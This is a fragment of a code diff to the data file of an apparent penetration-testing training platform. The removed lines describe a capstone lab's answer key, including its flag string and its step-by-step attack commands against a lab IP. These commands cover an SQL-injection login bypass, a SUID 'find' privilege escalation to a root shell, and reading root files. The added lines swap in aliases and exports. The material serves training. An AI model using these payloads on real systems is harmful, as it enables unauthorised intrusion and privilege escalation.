-    "flag": "flag{endlessus_capstone_certified_junior_pentester_2026}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Phase 1: Recon & Nmap Scan",
-        "instruction": "Scan 10.10.10.100 to discover open ports (22, 80): 'nmap -sV -p 22,80 10.10.10.100'."
-      },
-      {
-        "id": "t2",
-        "title": "Phase 2: Directory Fuzzing",
-        "instruction": "Fuzz endpoints to discover hidden administrative login: 'curl http://10.10.10.100/api/v2/auth'."
-      },
-      {
-        "id": "t3",
-        "title": "Phase 3: SQLi Exploitation",
-        "instruction": "Exploit SQL injection in login to extract API access token: 'curl -X POST -d \"user=admin\\'--&pass=x\" http://10.10.10.100/api/v2/auth'."
-      },
-      {
-        "id": "t4",
-        "title": "Phase 4: SSH Initial Foothold",
-        "instruction": "Connect to target shell as user cadet and retrieve user.txt: 'cat /home/cadet/user.txt'."
-      },
-      {
-        "id": "t5",
-        "title": "Phase 5: SUID Privilege Escalation",
-        "instruction": "Locate SUID /usr/bin/find and escalate privileges to root: 'find . -exec /bin/sh -p \\; -quit'."
-      },
-      {
-        "id": "t6",
-        "title": "Phase 6: Executive Reporting",
-        "instruction": "Capture root.txt and review the generated security remediation summary: 'cat /root/root.txt'."
-      }
-    ],
-    "hints": [
-      "Concept: Full methodology synthesis across all 10 stages.",
-      "Direction: Follow PTES: Recon -> Enum -> Exploit -> Foothold -> Privesc -> Report.",
-      "Tool: nmap, curl, SUID find, and cat.",
-      "Syntax: Step-by-step multi-stage execution.",
-      "Explanation: Successful completion awards the Endlessus Junior Pentester Certificate badge."
-    ]
+    "title": "Lab 13: Capstone Pentest: Final Enterprise Target",
+    "desc": "Execute a full-scope authorized penetration test on an enterprise target."
   }
-];
+};
 
-// Helper Lookup Index
-const ENDLESSUS_ROOM_MAP = {};
-ENDLESSUS_ROOMS.forEach(r => { ENDLESSUS_ROOM_MAP[r.id] = r; });
+// Maintain backward-compatibility aliases
+const ENDLESSUS_STAGES = PRE_SECURITY_LEVELS;
+const ENDLESSUS_ROOMS = PRE_SECURITY_ROOMS;
+const ENDLESSUS_ROOM_MAP = PRE_SECURITY_ROOM_MAP;
+const ROOM_TO_PRACTICAL_LAB = PRE_SECURITY_LAB_MAP;
 
-const ENDLESSUS_LAB_MAP = {};
-ENDLESSUS_PRACTICAL_LABS.forEach(l => { ENDLESSUS_LAB_MAP[l.id] = l; });
-
-console.log('[Endlessus Database] Loaded ' + ENDLESSUS_ROOMS.length + ' rooms across ' + ENDLESSUS_STAGES.length + ' stages + ' + ENDLESSUS_PRACTICAL_LABS.length + ' practical labs.');
+if (typeof window !== 'undefined') {
+  window.PRE_SECURITY_LEVELS = PRE_SECURITY_LEVELS;
+  window.PRE_SECURITY_ROOMS = PRE_SECURITY_ROOMS;
+  window.PRE_SECURITY_ROOM_MAP = PRE_SECURITY_ROOM_MAP;
+  window.PRE_SECURITY_LAB_MAP = PRE_SECURITY_LAB_MAP;
+  window.ENDLESSUS_STAGES = ENDLESSUS_STAGES;
+  window.ENDLESSUS_ROOMS = ENDLESSUS_ROOMS;
+  window.ENDLESSUS_ROOM_MAP = ENDLESSUS_ROOM_MAP;
+  window.ROOM_TO_PRACTICAL_LAB = ROOM_TO_PRACTICAL_LAB;
+}
 
 if (typeof module !== 'undefined' && module.exports) {
   module.exports = {
+    PRE_SECURITY_LEVELS,
+    PRE_SECURITY_ROOMS,
+    PRE_SECURITY_ROOM_MAP,
+    PRE_SECURITY_LAB_MAP,
     ENDLESSUS_STAGES,
     ENDLESSUS_ROOMS,
-    ENDLESSUS_PRACTICAL_LABS,
     ENDLESSUS_ROOM_MAP,
-    ENDLESSUS_LAB_MAP
+    ROOM_TO_PRACTICAL_LAB
   };
 }
